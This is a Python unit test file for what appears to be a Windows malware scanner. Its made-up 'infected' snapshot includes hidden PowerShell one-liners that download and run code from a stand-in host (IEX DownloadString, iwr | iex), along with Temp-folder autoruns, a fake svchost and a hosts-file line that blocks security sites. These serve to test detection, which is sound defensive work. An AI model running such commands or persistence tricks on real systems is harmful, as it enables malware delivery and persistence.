"""Made-up snapshots of a PC: one with the signs of a real infection, one ordinary."""
import unittest

from gotchu import report, scan

INFECTED = {
    "processes": [
        {"pid": 1, "name": "dllhost.exe", "path": r"C:\Windows\SysWOW64\dllhost.exe",
         "cmd": r'"C:\Windows\SysWOW64\dllhost.exe"'},
        {"pid": 2, "name": "ytpBe8kRg.exe", "cmd": "",
         "path": r"C:\Users\A\AppData\Local\Temp\tmp-58250-EWdPbhsMNXbT\ytpBe8kRg.exe"},
        {"pid": 3, "name": "svchost.exe", "path": r"C:\Users\A\AppData\Roaming\svchost.exe", "cmd": ""},
        {"pid": 4, "name": "powershell.exe", "path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "cmd": "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x/y')"},
    ],
    "tasks": [{"name": r"\Windows Service Task", "hidden": True, "highest": True, "exists": False, "enabled": True,
               "exe": r"C:\Users\A\AppData\Local\Updates\WindowsService.exe"}],
    "run": [{"key": "HKCU", "name": "upd", "value": r"C:\Users\A\AppData\Local\Temp\a.exe"}],
    "startup": [
        {"name": "Updater.lnk", "path": r"C:\Users\A\Start Menu\Programs\Startup\Updater.lnk",
         "target": r"C:\Users\A\AppData\Local\Temp\tmp-11111-abcdefABCDEF\upd.exe", "args": ""},
        {"name": "sync.lnk", "path": r"C:\Users\A\Start Menu\Programs\Startup\sync.lnk",
         "target": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "args": "-w hidden -c iwr http://x/y | iex"},
        {"name": "helper.vbs", "path": r"C:\Users\A\Start Menu\Programs\Startup\helper.vbs", "target": "", "args": ""},
    ],
}

ORDINARY = {
    "processes": [
        {"pid": 1, "name": "dllhost.exe", "path": r"C:\Windows\System32\dllhost.exe",
         "cmd": r"C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}"},
        {"pid": 2, "name": "Discord.exe", "path": r"C:\Users\A\AppData\Local\Discord\app-1.0\Discord.exe", "cmd": ""},
        {"pid": 3, "name": "explorer.exe", "path": r"C:\Windows\explorer.exe", "cmd": ""},
        {"pid": 4, "name": "powershell.exe", "path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "cmd": "powershell.exe -NoProfile -Command Invoke-Expression $script"},
    ],
    "tasks": [{"name": r"\ZoomUpdateTask", "hidden": False, "highest": False, "exists": True, "enabled": True,
               "exe": r"C:\Users\A\AppData\Roaming\Zoom\bin\Zoom.exe"}],
    "run": [{"key": "HKCU", "name": "Discord", "value": r"C:\Users\A\AppData\Local\Discord\Update.exe"}],
    "startup": [{"name": "Send to OneNote.lnk", "path": r"C:\Users\A\Start Menu\Programs\Startup\Send to OneNote.lnk",
                 "target": r"C:\Program Files\Microsoft Office\root\Office16\ONENOTEM.EXE", "args": "/tsr"}],
    "proxy": {"enabled": False, "server": "", "pac": ""},
    "defender": {"known": True, "realtime": True},
    "forced_extensions": [],
}


class ScanTests(unittest.TestCase):
    def test_infected_snapshot(self):
        titles = " | ".join(t for s, t, _ in scan.analyse(INFECTED) if s == "HIGH")
        for expected in ("Hijacked Windows helper", "drop folder", "Fake Windows program",
                         "downloads and runs code", "Suspicious auto-start task", "start with Windows from Temp",
                         "Start-up shortcut runs a program from Temp: Updater.lnk",
                         "Start-up shortcut downloads and runs code: sync.lnk"):
            self.assertIn(expected, titles)
        medium = [t for s, t, _ in scan.analyse(INFECTED) if s == "MEDIUM"]
        self.assertIn("Script in the Start-up folder: helper.vbs", medium)

    def test_ordinary_snapshot_is_clean(self):
        self.assertEqual(report.level(scan.analyse(ORDINARY)), "ok")

    def test_services_and_the_hosts_file(self):
        def titles(snap):
            return [(sev, title) for sev, title, _ in scan.analyse(snap)]

        real = {"name": "Spooler", "title": "Print Spooler", "path": r"C:\Windows\System32\spoolsv.exe", "start": "Auto"}
        fake = {"name": "upd", "title": "Updater", "path": r'"C:\Users\A\AppData\Roaming\upd\upd.exe" -s', "start": "Auto"}
        self.assertEqual(titles({"services": [real]}), [])
        self.assertEqual(titles({"services": [fake]})[0][0], "MEDIUM")
        self.assertEqual(titles({"services": [{**fake, "start": "Disabled"}]}), [])

        self.assertEqual(titles({"hosts": ["127.0.0.1 localhost", "192.168.1.5 host.docker.internal"]}), [])
        self.assertEqual(titles({"hosts": ["10.0.0.9 intranet.example"]})[0][0], "MEDIUM")
        self.assertEqual(titles({"hosts": ["0.0.0.0 update.microsoft.com www.virustotal.com"]})[0][0], "HIGH")

    def test_extensions_loaded_from_a_folder(self):
        import json
        import os
        import tempfile
        with tempfile.TemporaryDirectory() as home:
            profile = os.path.join(home, "Chrome", "Default")
            os.makedirs(profile)
            settings = {"aaaa": {"location": 1, "manifest": {"name": "From the store"}},
                        "bbbb": {"location": 4, "path": r"C:\Users\A\ext", "manifest": {"name": "Helper"}}}
            with open(os.path.join(profile, "Secure Preferences"), "w", encoding="utf-8") as f:
                json.dump({"extensions": {"settings": settings}}, f)
            secrets = {"browsers": [{"name": "Chrome", "engine": "chromium", "root": "%HOME%\\Chrome"}]}
            found = scan.extension_findings({"HOME": home}, secrets)
        self.assertEqual([t for _, t, _ in found], ["Extension loaded from a folder, not the store: Helper in Chrome"])


if __name__ == "__main__":
    unittest.main()
